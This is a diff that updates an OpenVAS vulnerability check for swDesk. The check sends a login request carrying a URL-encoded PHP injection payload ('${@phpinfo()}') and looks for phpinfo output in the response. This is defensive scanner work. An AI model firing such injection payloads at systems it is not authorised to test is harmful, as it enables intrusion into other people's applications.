@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_swdesk_51792.nasl 3062 2016-04-14 11:03:39Z benallard $
+# $Id: gb_swdesk_51792.nasl 5715 2017-03-24 11:34:41Z cfi $
 #
 # swDesk Multiple Input Validation Vulnerabilities
 #
@@ -38,23 +38,18 @@ code in the context of the affected application. This may facilitate a
 compromise of the application and the underlying system; other attacks
 are also possible.";
 
-
 if (description)
 {
  script_id(103425);
  script_bugtraq_id(51792);
- script_version ("$Revision: 3062 $");
-
+ script_version ("$Revision: 5715 $");
  script_name("swDesk Multiple Input Validation Vulnerabilities");
-
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51792");
  script_xref(name : "URL" , value : "http://www.swdesk.com/");
-
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
- script_tag(name:"last_modification", value:"$Date: 2016-04-14 13:03:39 +0200 (Thu, 14 Apr 2016) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-24 12:34:41 +0100 (Fri, 24 Mar 2017) $");
  script_tag(name:"creation_date", value:"2012-02-16 13:08:33 +0100 (Thu, 16 Feb 2012)");
- script_summary("Determine if installed swDesk is vulnerable");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
@@ -67,39 +62,36 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
    
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-if(!can_host_php(port:port))exit(0);
+foreach dir( make_list_unique( "/helpdesk", "/swdesk", "/swhelpdesk/", cgi_dirs( port:port ) ) ) {
 
-dirs = make_list("/helpdesk","/swdesk","/swhelpdesk/",cgi_dirs());
-host = get_host_name();
+  if( dir == "/" ) dir = "";
+  url = dir + "/signin.php";
+  buf = http_get_cache( item:url, port:port );
 
-foreach dir (dirs) {
-   
-  url = string(dir, "/signin.php"); 
+  if( "Powered by swDesk" >< buf ) {
 
-  if(http_vuln_check(port:port, url:url,pattern:"Powered by swDesk")) {
+    host = http_host_name( port:port );
 
-    req = string("POST ",dir," /signin.php HTTP/1.1\r\n",
+    req = string("POST ",url," HTTP/1.1\r\n",
                  "Host: ",host,"\r\n",
                  "Referer: http://",host,url,"\r\n",
                  "Content-Type: application/x-www-form-urlencoded\r\n",
                  "Content-Length: 74\r\n",
                  "\r\n",
                  "email=phpi%24%7B%40phpinfo%28%29%7D&password=phpi%24%7B%40phpinfo%28%29%7D\r\n");
+    res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
 
-    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-
-    if("<title>phpinfo()" >< result) {
-      security_message(port:port);
-      exit(0);
-    }  
-
+    if( "<title>phpinfo()" >< res ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
+    }
   }
 }
 
-exit(0);
+exit( 99 );
